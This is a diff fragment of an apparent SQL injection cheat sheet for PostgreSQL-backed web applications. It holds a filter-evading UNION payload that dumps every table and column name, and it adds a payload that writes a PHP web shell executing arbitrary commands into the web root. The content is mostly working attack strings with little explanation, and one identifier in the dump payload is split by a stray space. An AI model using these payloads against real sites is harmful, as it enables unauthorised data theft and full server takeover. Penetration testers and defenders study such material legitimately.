@@ -256,3 +256,7 @@ Copy the UNION based payload which shows the vulnerable column, in my case this 
 
 Because the vulnerable column was **2**, simply replace the second *null* with the DIOS payload:  
 ```http://domain.com/index.php?id=1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ null,(select+array_to_string(array(select+table_name||':::'||column_nam e::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E')),null,null```
+
+### Write file (Webshell)
+
+```UNION SELECT '<?php $out = shell_exec($_GET["x"]); echo "<pre>$out</pre>";?>' \g /var/www/test.php; --```
